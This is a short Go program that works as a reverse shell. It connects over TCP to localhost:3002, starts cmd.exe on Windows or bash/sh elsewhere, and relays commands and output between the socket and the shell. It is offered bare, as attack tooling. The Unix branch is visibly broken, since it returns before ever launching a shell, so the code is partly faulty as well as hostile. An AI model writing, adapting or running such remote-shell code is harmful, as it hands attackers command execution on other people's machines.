package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func fileExists(name string) bool {
	if _, err := os.Stat(name); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func pipeProcessToSocket(reader *bufio.Reader, writer *bufio.Writer) {
	buffer := make([]byte, 1024)

	for true {
		bytesRead, err := reader.Read(buffer)
		if err != nil {
			// panic(err.Error())
			return
		}
		if bytesRead <= 0 {
			panic("Error")
		}

		writer.WriteString(string(buffer[:bytesRead]))
		writer.Flush()
	}
}

func pipeSocketToProcess(socketReader *bufio.Reader, processWriter *bufio.Writer) {
	buffer := make([]byte, 255)
	for true {
		numberOfBytesRead, err := socketReader.Read(buffer)
		if err != nil {
			return
		}
		command := string(buffer[:numberOfBytesRead])
		if (!strings.HasSuffix(command, "\n")) {
			command = fmt.Sprintf(fmt.Sprintf("%s\r\n", command))
		}
		processWriter.WriteString(command)
		processWriter.Flush()
	}
}

func main() {
	address := "localhost:3002"
	conn, err := net.Dial("tcp", address)

	if err != nil {
		// panic(err.Error())
		return
	}
	defer conn.Close()
	socketReader := bufio.NewReader(conn)
	socketWriter := bufio.NewWriter(conn)

	var cmd string
	if runtime.GOOS == "windows" {
		cmd = "C:\\Windows\\System32\\cmd.exe"
		if !fileExists(cmd) {
			return
		}
	} else {
		cmd = "/bin/bash"
		shells := []string{
			"/bin/bash", "/bin/sh",
		}
		for _, shell := range shells {
			if (fileExists(shell)) {
				cmd = shell
				break
			}
		}
		// Not Found
		return
	}

	proc := exec.Command(cmd)

	stdin, err := proc.StdinPipe()
	if err != nil {
		panic(err.Error())
	}
	defer stdin.Close()
	stdout, _ := proc.StdoutPipe()
	defer stdout.Close()

	processReader := bufio.NewReader(stdout)
	processWriter := bufio.NewWriter(stdin)

	proc.Start()

	go pipeSocketToProcess(socketReader, processWriter)
	pipeProcessToSocket(processReader, socketWriter)

}
